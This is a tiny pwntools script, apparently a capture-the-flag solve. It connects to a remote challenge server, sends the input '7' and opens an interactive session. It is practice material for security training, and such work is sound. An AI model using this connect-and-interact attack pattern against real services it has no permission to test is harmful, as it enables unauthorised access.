from pwn import *
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28196)
io.sendline('7')
io.interactive()
